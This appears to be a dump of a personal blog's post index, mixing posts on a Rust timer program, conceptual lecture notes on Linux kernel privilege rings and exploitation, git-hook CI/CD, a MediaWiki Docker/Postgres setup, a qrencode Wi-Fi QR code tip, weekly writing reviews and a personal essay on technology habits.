time_as_minutes); let mut minutes_remaining = 0; while(minutes_remaining != time_as_minutes) { minutes_remaining = minutes_remaining + 1; let second = time::Duration::from_secs(60); thread::sleep(second); println!(\u0026#34;Going to sleep for {} more Minutes\u0026#34;, time_as_minutes - minutes_remaining ); } // sleep the remaining time let remaining_second = time::Duration::from_secs(remaining_time); thread::sleep(remaining_second); Command::new(\u0026#34;/usr/bin/notify-send\u0026#34;) .args(\u0026amp;[\u0026#34;-u\u0026#34;, \u0026#34;normal\u0026#34;, \u0026#34;-t\u0026#34;, \u0026#34;15000\u0026#34;, \u0026#34;StopClock\u0026#34;, \u0026#34;Times up!\u0026#34;]) .output(); // https://doc.rust-lang.org/std/process/struct.Command.html Command::new(\u0026#34;/usr/bin/mplayer\u0026#34;) .args(\u0026amp;[\u0026#34;-volume\u0026#34;,\u0026#34;50\u0026#34;, \u0026#34;/home/akendo/Downloads/end.mp3\u0026#34;]) .output(); } else { println!(\u0026#34;Please add only one argument!\u0026#34;); } } I feel a bit awkward, however, it was my first program that I developed in rust. Now we’re going to change it a bit. To be completely honest with you, I’ve changed it in between a bit because I added some improvements.\nBut what needs to be done here?\nAdd message after the timeout went down, as a remainder Allow using units like h or m to have more simpler input Handle suspend to ram situation Additional notification option Silence option But lately, I’ve seen the follow issue for me: A way to store the data and a way to have it count upwards. Why?\nI think this should reflect the task a bit more, when you do something present seen how much time you’ve spent on it feel better. And seeing how much time is left on a task that you have to do feels more relieving. It should also track how much time was spending on things, but I\u0026rsquo;m most likely going to put this into the time warrior.\nOne further problem does this program have: It cannot handle time jumps. This is sometimes handy, but often annoying. What does this mean? For instance, when you suspend the laptop, the program going to continue to count disregard of the time that has come to pass.\nSometimes you close the lid of your devices to move on. Hence, it would be neat to keep track of the underlying system time instead of just.\nBut at first, I’m going to clean up the code before we’re going further.\nwarning: 9 warnings emitted Finished dev [unoptimized + debuginfo] target(s) in 0.01s Gosh there are quite some warning. The compiler has improved a lot in the last four years!\nLet’s go by them warning for warning:\nWarning one: unused imports datetime warning: unused imports: `DatePiece`, `LocalDate`, `Month` --\u0026gt; src/main.rs:6:16 | 6 | use datetime::{LocalDate, Month, DatePiece}; | ^^^^^^^^^ ^^^^^ ^^^^^^^^^ | = note: `#[warn(unused_imports)]` on by default This related to some attempt at the beginning of the program to fix to suspend the issue. For now, we’re going to remove the datatime import until we have a good idea of how to keep track of it correctly.\nSeeing this already pops an idea into my head: Get the current time, add the time the program have to wait and check the time once the while loop is completed. But one thing after another.\nWhile disabling the import, I saw the variable in the next line. I am also going to change the size of MINUTE that is just below the import. An u64 huge to represent a two-digit number, I think. u8 should enough.\nThis will trigger some more error message now:\nerror[E0308]: mismatched types --\u0026gt; src/main.rs:38:45 | 38 | remaining_time = remaining_time - MINUTE; | ^^^^^^ expected `u64`, found `u8` error[E0277]: cannot subtract `u8` from `u64` --\u0026gt; src/main.rs:38:43 | 38 | remaining_time = remaining_time - MINUTE; | ^ no implementation for `u64 - u8` | = help: the trait `Sub\u0026lt;u8\u0026gt;` is not implemented for `u64` Obviously, this make sense since we’ve changed the size it becomes necessary to change it to the right size. Here is a good question, would it be not worth it to stick the u64 instead?\nHm… this is why having this written on the blog is awesome! Now I’m asking myself: What’s the benefit of saving a variable in a more effective size format vs. having perhaps more operations to convert it! My guess here is that it would be no more operation for the CPU because the C compiler only going to change the point internally, hence, it should be no different. But that’s a guess and I might need to search for this later on.\nFor the program we’re running this does matter anyway, however, this is an interesting question. Anyhow, here is what needs to be changed:\n- while (remaining_time \u0026gt;= MINUTE){ - remaining_time = remaining_time - MINUTE; + while (remaining_time \u0026gt;= MINUTE as u64){ + remaining_time = remaining_time - MINUTE as u64; I\u0026rsquo;m going to continue with this next week.\nso far,\nakendo\n","permalink":"https://blog.akendo.eu/post/2021-02-26-rust-stopclock/","tags":["StopClock","100DaysToOffload"],"title":"StopClock"},{"categories":["Fun"],"contents":"As a small side note: When I was searching for a thing related to the Linux kernel I got some quite ‘funny’ results back:\nNot that I take a stance about any of the results, it felt quite a misfit to the actual search and that made me laugh, that all.\nso far,\nakendo\n","permalink":"https://blog.akendo.eu/post/2021-02-26-fun-search-results/","tags":["100DaysToOffload"],"title":"Fun Search Results"},{"categories":["Security"],"contents":"This post is the sixth and last part of my notes from the lecture about kernel exploitation of pwn.college[0]. This also concludes the first lecture. Read the previous post first:\nHere about the fifth part. Here about the fourth. Here about the third part. Here about the second part. Here about first part. In the last post we did leaned about the kernel relationship to the user space. Today we see how the attack are happening in the kernel.\nBefore we’re going to get into the attack itself, it is worth to mention that kernel code is just code. Hence, all types of vulnerabilities affecting the code base too. I’m aware of the fact, that the kernel has some mitigation strategy to prevent format string vulnerabilities.\nA good example for an exploit was the ping of death. It included several useful aspects. Remotely and was often rather simpler to exploit. However, it was more common back in the 90s.\nMore modern exploit User space like syscall handles or interfaces of the kernel. This is mostly used to exploit sandboxes.\nHere some note: That’s one problem that docker has. It isolates process from within the kernel by using namespaces. However, unlike a VM all these names spaces share the same kernel. Leading to the underlying problem that an attacker can exploit syscalls (I think there are around 200 of them). That’s why you should and isolation layer in between. In modern clouds environments we often see that various clients will have all their container within a VM of it its own. But also there are some nice abstraction to have more isolation on the syscall level. gvisor[1] it is called.\nTheir exploit accesses due resources that is provided due to performance reasons.\nRemember in the previous post about the vsyscall mapping? Here is the thing why it was replaced. For once, it had only a limitation of four syscalls, BUT it was a kernel function that was read only where an attack could use some ROP to change the invoking parameters[2]. That’s not a desirable outcome, isn’t it?\nWhat we see is the difficulties of overlapping between kernel and user space boundaries. How hard it is to get it right and make sure that things are not going south. I think the vsyscall is a perfect example. None of the developers did think that it could be exploited that way.\nI think that’s why he’s mention this feature, it’s a low-hanging fruit that can be found by some simple googling around.\nBesides of this hidden example, an exploit can be executed by a device driver. There are even specified devices that can exploit it. teensy for instance.\nThere is a battery of broken hardware driver within the kernel bug tracker. Many found by fuzzers like Skycaller. The main problem here is that most maintainer are not reachable anymore or some other problem to get them to fix it. Hence, it is a good attack vector for exploitation.\nOnce you have established the necessary access level you want to pursue different goals:\nPersistent Rootkit and hiding to gain more access to deeper hardware for instance Androids TrustZone One hit I like to add is to own/pwn the machine, Apple iPhones for instance do not grant root privileges to you. Hence, running an exploit is the act of taking control and ownership.\nThis concludes the first lecture. I felt like that the last slides provided too much value information, at least for me. Next is to setup the testing environment.\nso far,\nakendo\n[1] https://gvisor.dev/ [2] https://lwn.net/Articles/446528/\n","permalink":"https://blog.akendo.eu/post/2021-02-25-kernel-exploitation-part-six/","tags":["kernel","100DaysToOffload"],"title":"Kernel Exploitation Part Six"},{"categories":["Security"],"contents":"This post is the five part of my notes from the lecture about kernel exploitation of pwn.college[0]. Read the previous post first:\nHere about the first part. Here about the second part. Here about the third part. Here about the fourth part. In the last post we did leaned about the kernels\u0026rsquo; effort to switch from one ring down to another one and when it becomes necessary. Today we see how the user space relates to the kernel space.\nKernel-Userspace Relationship Like any other program on your computer does the Kernel have its own address space (dahhh). The different is that the address in memory at a higher address. This is the opposite to User space address.\nAn artifact of this can be seen when we access the memory map (/proc/self/maps) of a user space program. With the map table exist the vsyscall entry.\nHowever, it is an out-dated function that existed for optimization reasons. The lecturer does not explain this in detail. But it is worth a small side step[1].\nBack in the days some syscalls where executed excessively to get quite little information from the kernel. gettimeofday is a good example for it. At some point this became too much overhead that the kernel developers decided to map it into the user space instead. Doing this mapping had some performance advantages. Yet, it introduces many other limitation and issues. In short it is outdated by today\u0026rsquo;s standard.\nThe interesting bit is the following: It still exists because application often rely on that fact. In the latest Debian release this was changed and might cause applications to break: They\u0026rsquo;re still assuming that these four mapped syscalls exists there. However, this was done for some security reasons and make a lot of sense.\nBack to the kernel space: The Kernel page access from user space via syscalls do not change the virtual address mapping! That’s probably the reason, why the kernel address are high up in addressing to allow consisted access to the given application. Moreover, it makes sense considering that there is, I think only a single virtual address for the kernel where everything of the kernel resides in.\nso far,\nakendo\n[0] https://pwn.college/modules/kernel [1] https://stackoverflow.com/questions/19938324/what-are-vdso-and-vsyscall\n","permalink":"https://blog.akendo.eu/post/2021-02-25-kernel-exploitation-part-five/","tags":["kernel","100DaysToOffload"],"title":"Kernel Exploitation Part Five"},{"categories":["CI/CD"],"contents":"With my affords to fix pineview, I’m in the situation to think about what I want to have for a CI/CD. Having it would improve blogging and deployment because I could also use my phone for it. However, many CI/CD I know do not offer the necessary ‘smallness’ for what I need.\nA CI/CD is nothing more than a machine with remote code execution. You push your commit to it and the machine starts right away to execute any given code. There are various great CI/CD system. But, many of them are just vastly to big. GitLab requires a massive number of resources and bypassed being a container to host code long ago. The attached CI/CD can couple with many complex scenarios, but has become to complex on it own.\nWhat I want is a simple and slick system. Lucky, git itself provides everything you need. Instead of having some framework to make it run, all what I’m going to do is executing a bash script. Within git there are hooks implemented. Whenever a state change occurred within git, you can trigger it.\nFor instance, there are pre-merge hooks. They are mainly used to ensure consistency: Was the commit signed? Is there maybe a typo in the hook is this a push to a restricted branch?\nA CI/CD will utilize the post-hook. Once you’ve completed a push, and it was merged into the branch it\u0026rsquo;s going to trigger my deployment script!\nso far,\nakendo\n","permalink":"https://blog.akendo.eu/post/2021-02-24-ci-cd/","tags":["100DaysToOffload"],"title":"CI CD"},{"categories":["CI/CD"],"contents":"Pineview was my old production server at home. It did run many services like git, and I planned to use it be part of my CI/CD. However, some weeks ago the storage controller broke down and the disk where partly not recognized. When it was, the controller did not read data correctly from the disk.\nYesterday, I’ve started to restore it I’m using an old laptop. It is a nice change because the CPU in that laptop is much stronger than the Atom one. Furthermore, it can utilize the SSD better. But the CPU only support 32-Bit and that causes trouble because some software I run, runs mainly on 64-Bit.\nWhat software? You might be surprised: docker and here is the thing. Technically, you have 32-bit support. For instance, Debian have 32-bit port, however, only few upstream docker repository do support 32-Bit natively. When you try to fetch an image chances are high that you\u0026rsquo;re not getting an image that was built for 32-bit. This makes the entry docker for 32-bit broken.\nI’ve tried to port some container manual with a 32-bit base image, but even then I got the follow error message:\nstandard_init_linux.go:207: exec user process caused \u0026quot;exec format error\u0026quot; But this makes the restoring process difficult. I need to think what I should do next because porting 64-bit to 32-bit seems just ridiculous and running an emulation 64-bit seems stupid. I’m going to port the software out of the container probably. That removes the portability, but most of the software within should be able to run natively.\nso far,\nakendo\n","permalink":"https://blog.akendo.eu/post/2021-02-23-restoring-pineview/","tags":["100DaysToOffload"],"title":"Restoring Pineview"},{"categories":["review"],"contents":"This week was the worst in terms of writing. This is to the fact, that I had to care for someone and wasn’t able to take the time I needed for writing. The little writing I made was on the other hand good. But, I did not much progress with the existing topics. I’ve started on the CI/CD topic, without much progress.\nBlog CI/CD (Part two) kernel exploration (Part four) PV (Part two) Rust nftables However, in this week things are will getting back to normal, finally. Hence, I’m going to take the time to write at the nftable. Also, I wanted to post about my broken hardware in this week. Hopefully, I get the SPI clamp back to flash new firmware to a broken hardware.\nso far,\nakendo\n","permalink":"https://blog.akendo.eu/post/2021-02-21-review-cw07/","tags":["100DaysToOffload"],"title":"Review CW07"},{"categories":["News"],"contents":" How I Made a Self-Quoting Tweet ","permalink":"https://blog.akendo.eu/flash/17.02.2021-linkdrop/","tags":["Security"],"title":"17.02.2021 - link drop"},{"categories":["Blog"],"contents":"Many years ago, I moved to my first flat for my schooling. This was in a different city and time. Hence, everything was new. The first few weeks weren\u0026rsquo;t good nor bad, just new. Caring for myself, getting used to a new environment and getting along on my own. I took time for learning and making homework.\nAfter a while, I started to explore the city and started to make some friends. Some who weren\u0026rsquo;t directly related to my social environment. Then something bad happened and everything of broader self-care I\u0026rsquo;ve made vanished. I stopped doing my homework. I stopped caring more than I had to for myself.\nBut what in the world was it that caused you to stop caring for yourself, you might ask? It is simple: I started to have internet. With internet connection in the flat, I\u0026rsquo;ve started to be distracted by things. What kind of things? Gaming, watching TV shows and so on.\nAs many others, I was not really properly introduced to a first TV and later the computer. Eventually I was hooked to it and started to receive my instant gratification whenever I wanted to. It was that simple that you got used to it and stayed with it. In short, the problem with the internet started for me long before I moved.\nIt then became more than just a reward, it became my lifestyle. When I came home from basic school, the first thing was to turn on the TV. Beaten up by classmates and your teacher this was a way to cope with distress. Just let it pass me. It was a thing that I just did and once the TV became boring I moved to games.\nAnd it got out of hand, and it became my coping mechanism for everything that felt difficult. My parents tried to regulate me. It was just that they were as bad with regulating me as with themselves. They did not provide the guidance a young boy needed. They were simply not home to prevent it. My friends were in that mess too. Gaming was everything for us.\nBut it is not that simple. At some point in my flat I\u0026rsquo;ve stopped to game because it became too invasive. I\u0026rsquo;ve stopped watching TV shows because it became predictive and boring. And then I replaced it with hacking. Or in short: with an excessive use of technology. Yet still with as little care for myself as for anyone else.\nAnd I didn\u0026rsquo;t need anyone, but I was unhappy. I knew that there was more to life than this. But I wasn\u0026rsquo;t able to break free. This is because I\u0026rsquo;m an addict to technology.\nWe all are today. It is hard to pass by a day without a computer. It is everything, and it almost contains all of your life. Think about your smartphone, it is not just to call someone. It is a map, your camera, your notebook, your wallet.\nSo far, akendo\n","permalink":"https://blog.akendo.eu/post/2021-02-16-about-technology/","tags":["100DaysToOffload"],"title":"About Technology"},{"categories":["Linux"],"contents":"This is part two of my Media Wiki documenation[0]. It has been a while since I\u0026rsquo;ve looked at this matter, but I planed it to progrss for this.\nWe stopped with a running docker container with postgresql as the backend databases. However, this change was done manual. Hence, restarting the container would causes us to lose it. We need to persist this change now.\nThis is done by modfing the base of media wiki to include the psql extension[1] for PHP. Because I can\u0026rsquo;t change the upstream iamage, i\u0026rsquo;m going to build it locally. For this we create a new Dockerfile. That Dockerfile takes the media wiki images as the base and runs the command we did run before manual. We keep it with a subfolder of the Docker-compose file.\nFROM mediawiki RUN apt update \u0026amp;\u0026amp; apt install -y libpq-dev RUN docker-php-ext-install pgsql RUN docker-php-ext-enable pgsql Afterwards, we can test this by build the image.\ndocker build -t mediawiki-postgres . Once the build was successfully compledted I\u0026rsquo;m going to replace the beviously run instance of media wiki with the newly build one.\ndocker run --name some-mediawiki -p 8080:80 -d mediawiki-postgres This will reset the installation routine. However, we do not care because we only want to see that we could install it with the postgres backend. Once the container is start we\u0026rsquo;re going to localhost:8080 and we can see that the postgres is present! Great.\nThe next step is to replace the old image within the docker-compose file. Also we\u0026rsquo;re going to define a a Context. This way we can build it if we want to update.\nUpdate the image:\nversion: \u0026#39;3\u0026#39; services: mediawiki: image: mediawiki-postgres build: context: ./MediaWiki-postgres restart: always ports: - 8080:80 depends_on: - db #volumes: # - /var/www/html/images # After initial setup, download LocalSettings.php to the same directory as # this yaml and uncomment the following line and use compose to restart # the mediawiki service # - ./LocalSettings.php:/var/www/html/LocalSettings.php I should not forget to git init and commit at this stage. Now we erestart the container and copy the configuration again. Bam, the previosuve install is presented!\nNext step is setting up the first deployment with nginx and let\u0026rsquo;s encrypt.\nso far,\nakendo\n[0] https://blog.akendo.eu/post/2020-12-01-mediawiki-part-one/ [1] https://www.php.net/manual/en/pgsql.installation.php\n","permalink":"https://blog.akendo.eu/post/2021-02-15-mediawiki-part-two/","tags":["MediaWiki","docker","100DaysToOffload"],"title":"MediaWiki Docker[part two]"},{"categories":["Review"],"contents":"Oh, boy this was a troublesome week. I quite got lost in clean up and some rather emotional topics. But first things first:\nBlog CI/CD (Part one) kernel exploration (Part four) PV (Part two) Rust nftables In this week I’ve started to clean up much of the source files from the blog. This is necessary to the CI/CD. I did not have all the posts within git and there are still some files left. Things like images and some binary files. But I count this as a step forward here.\nBased on the posts I’ve also changed the writing habit once more. Going to take some further adjustments, however, this is more plan out this week than the weeks before.\nOne other big factor is that I’m going to use LanguageTool instead of Grammarly. Grammarly is terrible for privacy and this is a big concern of mine. The last change is that I’m timeboxing the writing to 30 minutes. This is necessary to not get lost in writing and/or details.\nso far, akendo\n","permalink":"https://blog.akendo.eu/post/2021-02-14-review-cw06/","tags":["100DaysToOffload"],"title":"Review CW06"},{"categories":["News'] tags: ['Writing"],"contents":" Writing English as a Second Language ","permalink":"https://blog.akendo.eu/flash/13.02.2021-linkdrop/","tags":null,"title":"13.02.2021 - link drop"},{"categories":["Blog"],"contents":"In the last days I had to go through my older posts. Many of them where unevenly named or some did not have a correct header placed. To put this into numbers there are around 186 posts and around 60 are in draft status. Meaning that 1/3 of my written posts are drafts. …and it is quite a mess in there right now.\nThe pattern of creation is also interesting. For a longer period of days I’m idling. Then I have an explosion of ideas, up to three at once. However, often these keep in a draft state. Some posts are just created to catch the idea. Many others are left in an incomplete state. Few posts are fine, and I didn’t feel good about posting them\u0026hellip;to keep it short: it is a mess.\nBrowsing through the posts I notice a pattern in creation dates that is interesting. For a longer period of days I’m idling. Then I have an explosion of ideas, up to three at once. However, often these keep in a draft state. Some posts are just created to catch the idea. Many others are left in an incomplete state. Few posts are fine, and I didn’t feel good about posting them.\nIt works like this in detail, I think: I start to work on the idea and while working on it, I got another idea and start to do some research. This is where I get sidetracked. The worst moment are when I then get lost in details. Either for the research or the writing.\nHere comes the funny thing: This pattern seems to be consistent over the last days when I wrote almost every day too. Long story short: I need to work ion my planning. Because I get sidetracked that often, I should ask of how to handle this more better?\nThis might be related to my writing process in which I mixed up the different types of task. Frequently, I start to write without a topic and follow the flow, just like this post. At some point I need to search something or need to know something. Here the new idea strikes me and I start to focus on this topic.\nInstead, I should try to have a more narrow idea what I try what I want to write or either I completed the research and make the notes separately. Once I\u0026rsquo;ve completed it, I write about what I\u0026rsquo;ve found.\nso far,\nakendo\n","permalink":"https://blog.akendo.eu/post/2021-02-13-post-clean-up/","tags":["100DaysToOffload"],"title":"Clean Up"},{"categories":["Linux"],"contents":"A while ago I saw a nice Tweet on how to create QR codes from the command shell. There using the command qrencode.\nThis command can be used to display a WiFi Password. With an iPhone or Android (10) you’re able to scan QR code and connect to Wifi.It is more comfortable than entering the password on a phone.\nThe string that will be placed within the QRcode needs to follow a specific format, here is an example for this:\nqrencode -o - 'WIFI:T:WPA;S:MyNetworkName;P:ThisIsMyPassword;; ' |display The command will generate the following QR code that can be used by a mobile device. Scanning it with the camera app will ask you to connect to the given Wifi:\nScanning this with the phone will put the following display:\nPretty neat, right?\nso far,\nakendo\n","permalink":"https://blog.akendo.eu/post/2021-02-12-useful-command/","tags":["Wifi","100daystooffload"],"title":"Use qrcodes for wifi"},{"categories":["Blog"],"contents":"For my series on kernel exploitation[0] I need to embed a YouTube video. The markdown code I\u0026rsquo;ve used for this wasn\u0026rsquo;t working. It most like does not due to some security configuration in the header of the webbrowser. Because, I did not wanted to re-configure them I\u0026rsquo;ve decided to embed it properly with a shortcodes[1] instead.\n\u0026lt;div class=\u0026#34;embed video-player\u0026#34;\u0026gt; \u0026lt;iframe class=\u0026#34;youtube-player\u0026#34; type=\u0026#34;text/html\u0026#34; width=\u0026#34;640\u0026#34; height=\u0026#34;385\u0026#34; src=\u0026#34;https://www.youtube.com/embed/{{ index .Params 0 }}\u0026#34; allowfullscreen frameborder=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;/iframe\u0026gt; \u0026lt;/div\u0026gt; Hugo has an example within its documentation[1] that I used at first. However, it only embedded the Video in the text without adapting the size of the frame. When you opened the post on a mobile web browser it looked massively misalignment. The fix is to make the embedding responsive. Because I hate HTML, I just searched for something on the web and found a great tutorial[2]. I copied the code down from the example. So should out to Flavio Copes for this Tutorial! Great work mate!\nThe only problem that is left is one with the CSS code. It will be placed in the summary of the post instead of the first paragraph. I’m not sure how to address this. For the moment, I just put the video shortcode after a paragraph.\nso far,\nakendo\n[0] https://blog.akendo.eu/post/2021-02-01-kernel-exploitation-part-one/ [1] https://gohugo.io/templates/shortcode-templates/#single-positional-example-youtube\n[2] https://flaviocopes.com/responsive-youtube-videos/\n","permalink":"https://blog.akendo.eu/post/2021-02-10-hugo-youtube-shortcode/","tags":["Hugo","100DaysToOffload"],"title":"Hugo Youtube Shortcode"},{"categories":["Security"],"contents":"This post is the fourth part of my notes from the lecture about kernel exploitation of pwn.college[0]. Read the previous post first:\nHere about first part. Here about the second part. Here about the second thrid. Switching between rings This slide made more sense after staring at it for a while. Because we started to define what rings are and how we are affected by them. Now, we want to know how such a switch occurs.\nAny computer will boot with ring 0 enabled by default. I wrote about the boot process in my bachelor theses[1]. I did not write that detail. But it is safe to assume that the process is in real mode after power-up. It also includes that it is in ring 0. What is to remember here is that this is a historical aspect of CPUs. These things are part of the CPU that has to be present to ensure that nothing is breaking because it might be possible that SOMEONE still uses it! Intel can not afford this.\nThat reminded me of a different but similar problem within the industry, to stick to old working standards. Microsoft had vulnerabilities[3] that weren’t able to be fixed because it would break customer applications. Essential this was the reason why SMB v1 was kept for so long in windows until the NSA leak. Leading to the situation that even Windows 10 systems were being affected. Microsoft has disabled SMBv1 now. But there are more of such things in Windows and most likely in Intel too.\nObviously, we are not bothered with the boot process too much here. Once the kernel is loaded, we’re back into the course. Before I return to the lecture, I was wondering about that MSR_LSTAR .\nAfter searching within the Linux kernel sources about it, I found this definition[2]. The value of MSR_LSTAR will be translated to 0xc0000082. Does that mean that written data are just dropped through into the register of the CPU? It is just a register? Somehow I feel stupid now because it did not make much sense until now.\nMaybe\u0026hellip;For instance, in some assembler code sample, there are using syscalls by writing into some special memory address. I think that is what is happening here as well. I guess that’s what he is implying within the video that everything is just the same, just a bit more special.\nAh, so your kernel sees that there is a pointer within the MSR_LSTAR register. That triggers the kernel to switch into ring 0. Then the CPU executes the code and once it completed it writes the return address into RCX.\nAh, so your kernel sees that there is a pointer within the MSR_LSTAR register. That triggers the kernel to switch into ring 0. Then the CPU executes the code until it finishes it. Afterward, it will write the return address into RCX and will drop the privileges. This will be indicated by the keyword \u0026lsquo;CPL\u0026rsquo;. It resembles CPU Privilege Level in this context. Lastly the kernel will return the regular execution with the pointer stored in RCX.\nGosh I think I got it.\nso far,\nakendo\n[0] https://pwn.college/modules/kernel [1] https://blog.akendo.eu/post/2019.06.10-securing-hardware-with-coreboot/#boot-process [2] https://github.com/torvalds/linux/search?q=MSR_LSTAR\n","permalink":"https://blog.akendo.eu/post/2021-02-07-kernel-exploitation-part-four/","tags":["kernel","100DaysToOffload"],"title":"Kernel Exploitation Part Four"},{"categories":["Review"],"contents":"This week was very difficult in writing. I’ve got lost in the details and then there was life. So what has changed in the last weeks?\nkernel exploration Part four PV (part two) Rust nftables Blog CI/CD Technically, I’ve should a review in the last week. But I missed it out because I spend way more effort on the kernel exploration posts than planned. In retrospection, I might went overboard with it. However, it feels great to take the time to such an important topic. Also, I think, I should keep these smaller for the moment. I feel like that these become too big instead and I\u0026rsquo;m getting nothing out. Once I\u0026rsquo;ve completed them I’m going to put them into a single big post, I think.\nso far,\nakendo\n","permalink":"https://blog.akendo.eu/post/2021-02-07-review-cw5/","tags":["100DaysToOffload"],"title":"Review CW5"},{"categories":["News"],"contents":" Intel Problems The power of two random choices - Marc\u0026rsquo;s Blog Advice to Myself When Starting Out as a Software Developer - The Pragmatic Engineer ","permalink":"https://blog.akendo.eu/flash/06.02.2021-linkdrop/","tags":[],"title":"06.02.2021 - link drop"},{"categories":["Security"],"contents":"This post is the third part of my notes from the lecture about kernel exploitation of pwn.college[0]. Read the previous post first:\nHere about first part. Here about the second part. We continue on the different types of architecture or philosophy of kernels:\nMonolithic kernel:\nA Monolithic kernel loads any module within ring 0. Meaning every module operates with the boundary as every aspect of the code. Micro kernel:\nA Microkernel is the opposite of a monolithic kernel. It means that the kernel only executes a few lines of code within ring 0. The CPU will operate any other code within the lower privilege rings. An example of a Microkernel is minix[1]. However, it is slow because whenever a fewer privileges ring needs to talk to ring 0, it needs to switch context or something like that. Here is a fun fact: Intel has moved minix into the Intel ME. With newer CPU generations from Intel, they dropped the hardware specifies ARC processor and embedded an Atom processor instead. The software is using minix as its OS. Hybrid Kernel:\nA mix of both. Windows NT and modern Mac OS are examples. Some part of the code is in ring 0 others are not. How does this matter to us? Because Linux allows exploitation of faulty drivers to gain higher privileges!\nso far,\nakendo\n[0] https://pwn.college/modules/kernel \\\n","permalink":"https://blog.akendo.eu/post/2021-02-04-kernel-exploitation-part-three/","tags":["kernel","100DaysToOffload"],"title":"Kernel Exploitation Part Three"},{"categories":["News"],"contents":" How the Best Hackers Learn Their Craft - YouTube ","permalink":"https://blog.akendo.eu/flash/03.02.2021-linkdrop/","tags":[],"title":"03.02.2021 - link drop"},{"categories":["Security"],"contents":"This is the secound part of my notes from the lecture about kernel exploitation of pwn.college[0]. Read here about first part.\nHe is continuing with the typical ring diagram. I love the fact that he talks about other architecture than x86, however, he left out which one. Do these architectures have more rings or different types of architectures for the privilege? Maybe is he thinking of ARM[1] with the fewer level of privileges?\nThe outer ring is 3. It’s the most restricted one, yet that is sufficient to execute Google Chrome or Counterstrike. Some note on this matter: I’m not sure if this accurately depicts because both interact with the GPU that requires some higher privileges? hm\u0026hellip;I think about this point to the device driver as an API for such operations. Ah, I know why: The hardware abstraction causes difficulty for games. Game console this to skip this for the sake of performance, I think.\nBack to the lecture. Ring 3 is for Userspace mainly. The remaining rings have some rare use cases. For instance, when operating with the in or out instruction. Meaning for a process that requires limited access to hardware, but nothing else instead. Ring 0 is the Supervisor mode. You can do things that might break your hardware.\nFun fact: Back in the day, when Intel introduced ACPI. The kernel should take care of the power management of physical hardware, like battery and so on. However, most vendors did a poor job with this. So Intel decided to move this feature into an access level of its own that resided within the hardware. We call this the System Management Mode (SMM)[2] or ring -1. It is there to maintain power management with the BIOS level. With the years, it did grow in its function and is invisible to the operating system.\nHe does not refer to the existence of such modes yet. Instead, he put the kernel into ring 1 and adds the hypervisor as ring 0. Considering the SSM, a Hypervisor could be introduced between hardware and kernel, making this to the ring -1 and then SSM to ring -2. With the Intel ME, we also have an additional layer onto of that adding up more. That’s most often outside of the kernel and can mostly not influenced by it. But at this stage it just becomes bizarre.\nHe talks about the 2000er years when the first VMs came onto x86. Another fun fact: IBM\u0026rsquo;s mainframes had full hardware virtualization a long time before. It was just the time when CPU resources could be shared because there were not that well saturated. Instead, resource separation with isolation arises as a need within the x86 market, leading to the creation of the hypervisor.\nI guess he talks about these points for the reason, that some software wasn’t able to handle the translation from bare metal to virtualization correctly. Hence, moving the kernel on level up in a virtual matter for a consistent view for the application while still having the hypervisor doing its duty.\nHypervisors are fun. I should take a look more at them.\nso far,\nakendo\n[0] https://cse466.pwn.college/ [1] https://developer.arm.com/documentation/102412/0100/Privilege-and-Exception-levels [2] https://de.wikipedia.org/wiki/System_Management_Mode\n","permalink":"https://blog.akendo.eu/post/2021-02-02-kernel-exploitation-part-two/","tags":["kernel","100DaysToOffload"],"title":"Kernel Exploitation Part Two"},{"categories":["Security"],"contents":"This post reflects my notes and additional thoughts about the first lecture about kernel exploitation of pwn.college[0]. Until a moment ago, I wanted to publish the notations altogether. However, this post contained already more information than I want to do in a day. Because I’m working on this post for three days now, I\u0026rsquo;ve decided to split it.\nWe’re going to define what a kernel is. To make it dead simple: a kernel is a piece of software that governs hardware. You can compare it to a government. Working with the kernel means moving into a different layer of abstraction.\nHere I like to add a thought about this metaphor. It is useful but does not include voting. In this metaphor, you would be the voters and your vote for an operating system. However, often, once a OS was installed, it’s going to resist change.\nWhat are external resources I was wondering why he shows these assembler commands here. I guess that these instructions are widely used and should be understood therefore early. The hlt operation halts computation and should be only executed by the kernel.\nThe idea at its core is that only operation that relates to the hardware should here. Another sample is the in and out instruction that should get data from input or output. When we have LEDs, we want to address this often will be executed by such instruction. I mainly, however, had an embedded system without any form of a kernel.\ncr3 is a control register[1] that is responsible for the page table. The word control implies here not only storing data but change the behavior of the CPU. It means that it helps to lookup memory addresses from virtual memory. We might be able to tinker with the memory layout when access is unrestricted here. Hence all of these instructions require higher privileges. Learning about these five keywords gave me the idea to test this instruction with a simple program. Something that I might do later.\nThe MSR_LSTAR is another register and It is responsible for syscalls, if I get this correctly.\nSome comment to the word dichotomy, I knew it before, but it requires a bit of clarification. The words have a bit of a different meaning, depending on the language and context. In this specific case, the lecturer relates to a structure that opposes each other without a logical intersection. Program languages also have a dichotomy. C++ is an example in which the memory model consists of Stack and Heap. There is also the dichotomy fallacy and so on.\nAbout 5:20, he asks: How do the kernel and CPU know who is allowed to execute a privileged instruction. My answer is that each process will have a mark or id that represents its access level. The CPU only executes a given instruction with kernel privileges when the access level is correct. For Linux this should be the id zero, I guess. But let’s see.\nHis answer overlaps quite well with mine.\nso far,\nakendo\n[0] https://pwn.college/modules/kernel [1] https://en.wikipedia.org/wiki/Control_register#CR3\n","permalink":"https://blog.akendo.eu/post/2021-02-01-kernel-exploitation-part-one/","tags":["kernel","100DaysToOffload"],"title":"Kernel Exploitation Part One"},{"categories":["News"],"contents":" The Super Mario Effect - Tricking Your Brain into Learning More | Mark Rober | TEDxPenn ","permalink":"https://blog.akendo.eu/flash/30.01.2021-linkdrop/","tags":[],"title":"30.01.2021 - link drop"},{"categories":["security"],"contents":" Because I already knew a bit of hardware-related operation and you often find code statements like the following:\n#define EFER_FFXSR (1\u0026lt;\u0026lt;_EFER_FFXSR) I like to add some notes about working with a physical address in a computer system. When you reading code that relates to the hardware you’ve seen an operation like this:\n0x2000 \u0026lt;\u0026lt; 4 What’s the meaning of this? What’s happening is a binary operation moving the value one to the right. Causing a multiplication or division of the underlying value. Depending on the direction of the moving operation. For instance:\n0x200 hex(0x200 \u0026lt;\u0026lt; 1) \u0026#39;0x400\u0026#39; When we want to multiple a value by 16 for instance we move it 4 times to the right. Why? Cause \\(2^4 = 16\\), This operation is very effective unlike a real multiplication within a computer.\nso far,\nakendco\n","permalink":"https://blog.akendo.eu/post/2021-01-29-kernel-exploitation-sidenotes/","tags":[" learning","kernel","100DaysToOffload"],"title":"Kernel Exploitation Sidenotes"},{"categories":["News"],"contents":" How hard should I push myself? - Superorganizers - Every Still Alive - Astral Codex Ten 